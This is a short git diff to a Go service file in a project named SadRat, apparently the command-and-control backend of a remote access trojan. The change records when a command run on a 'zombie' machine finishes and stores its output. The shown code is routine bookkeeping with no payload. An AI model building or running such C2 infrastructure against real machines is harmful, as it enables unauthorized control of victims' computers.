@@ -3,6 +3,7 @@ package service
 import (
 	"github.com/VitorDie/SadRat/internal/domain"
 	"github.com/google/uuid"
+	"time"
 )
 
 // ConcreteServer é a Camada de Serviço que guarda as regras de negócio do C&C
@@ -60,14 +61,15 @@ func (s *ConcreteServer) SendJobs(agentID string) (domain.JobRow, error) {
 
 // ReceiveJobResult recebe o output do comando executado no zumbi e atualiza a entidade
 func (s *ConcreteServer) ReceiveJobResult(jobID string, output string) error {
-	// 1. Regra de Negócio: Buscamos a entidade atual no banco
+	// 1. Buscamos a entidade atual no banco
 	job, err := s.db.GetJob(jobID)
 	if err != nil {
-		return err // Retorna o erro e aborta se o Job não existir
+		return err 
 	}
 
-	// 2. Regra de Negócio: Atualizamos o Output do comando.
-	// Como na sua struct o Output é um ponteiro (*string), usamos '&' para pegar o endereço da variável
+	// 2. REGRA DE NEGÓCIO: Atualizamos o Output E a Data de Execução!
+	now := time.Now()
+	job.ExecutedAt = &now // <-- A regra que estava faltando!
 	job.Output = &output
 
 	// 3. Persistência: Salvamos a entidade atualizada de volta no banco
